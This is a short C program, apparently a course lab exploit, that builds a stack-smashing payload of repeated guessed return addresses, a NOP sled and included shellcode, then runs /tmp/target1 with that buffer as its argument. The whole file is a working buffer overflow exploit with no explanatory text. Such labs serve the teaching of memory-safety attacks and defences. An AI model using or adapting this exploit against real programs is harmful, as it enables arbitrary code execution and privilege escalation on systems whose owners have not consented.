#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"
#define BSIZE 260
#define OFFSET 0
#define NOP 0x90
#define START_ESP 0xbffffce0 //0xbffff838

int main(void)
{
  char *args[3];
  char *buff, *ptr;
  char *env[1];
  int bsize = BSIZE;
  int offset = OFFSET;
  int i;
  long *addr_ptr, addr;

  if (!(buff = malloc(bsize))) {
    printf("Can't allocate memory.\n");
    exit(0);
  }
  addr = START_ESP - offset;
  // printf("Using address: 0x%x\n", addr);
  ptr = buff;
  addr_ptr = (long *)ptr;
  for(i=0; i<bsize; i+=4) 
    *(addr_ptr++) = addr;

  for(i=0; i<bsize/2;i++) 
    buff[i] = NOP;

  ptr = buff + ((bsize/2) - (strlen(shellcode)/2));
  // printf("%x %x %d\n", buff[1]&0xff, ptr, bsize);
  for (i = 0; i < strlen(shellcode); i++)
    *(ptr++) = shellcode[i];

  buff[bsize - 1] = '\0';
  // printf("Buff: %x\n", *buff);

  args[0] = TARGET; args[1] = buff; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
